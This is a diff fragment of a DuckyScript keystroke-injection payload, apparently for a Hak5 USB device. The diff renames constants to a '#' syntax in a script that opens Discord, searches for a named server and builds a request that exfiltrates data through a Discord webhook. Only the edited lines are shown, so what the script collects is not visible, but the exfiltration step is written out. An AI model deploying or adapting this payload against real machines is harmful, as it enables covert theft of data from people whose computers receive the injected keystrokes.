@@ -15,10 +15,10 @@ REM     - Discord Installed
 
 
 REM You must define the Discord server name i.e. Hak5
-DEFINE SERVER_NAME example
+DEFINE #SERVER_NAME example
 
 REM You must define your Discord webhook if you want to use this method for the exfiltration
-DEFINE DISCORD_WEBHOOK example
+DEFINE #DISCORD_WEBHOOK example
 
 REM Open Discord app
 GUI
@@ -33,7 +33,7 @@ REM Search by Discord keyboard shortcut and open it
 CTRL k
 DELAY 500
 STRING *
-STRING SERVER_NAME
+STRING #SERVER_NAME
 ENTER
 DELAY 500
 
@@ -136,7 +136,7 @@ DELAY 2000
 
 REM Exfiltration using Discord Webhook
 STRING $WebhookUrl = "
-STRING DISCORD_WEBHOOK
+STRING #DISCORD_WEBHOOK
 STRINGLN "
 
 STRING $Payload = @{content = "
